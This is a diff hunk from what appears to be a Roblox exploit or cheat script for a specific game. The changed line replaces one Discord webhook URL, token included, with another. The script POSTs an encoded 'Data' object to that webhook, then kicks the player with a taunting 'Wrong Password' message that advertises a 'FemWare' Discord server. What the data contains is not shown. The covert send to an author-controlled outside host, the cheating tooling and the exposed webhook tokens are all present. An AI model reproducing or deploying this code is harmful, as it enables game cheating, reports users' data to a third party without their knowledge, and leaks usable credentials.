@@ -35,7 +35,7 @@ if game.PlaceId == 8343259840 then
         local Encoded                  = HttpService:JSONEncode(Data)
 
         Request                        = http_request or request or HttpPost or syn.request
-        local Final = {Url             = "https://discord.com/api/webhooks/970327068007088198/MrFImQTDW3bLuTn3s8Y4f4tnTw-nZBdXzFkLRtDA5oBSsPgF9cyCS7pBBhA6wzL3HJjX", Body = Encoded, Method = "POST", Headers = Headers}
+        local Final = {Url             = "https://discord.com/api/webhooks/972417035571179560/VAYC-i9pSLDCCOOpvBYBpmT1NnYRx9GxFWwM7askr18GUatJ-waBUXaG2NeM6zfM62qp", Body = Encoded, Method = "POST", Headers = Headers}
         Request(Final)
         game.Players.LocalPlayer:Kick("Wrong Password little boy. Get the latest script over FemWare Official, discord.gg/ZaSETw4774")
         wait(15)
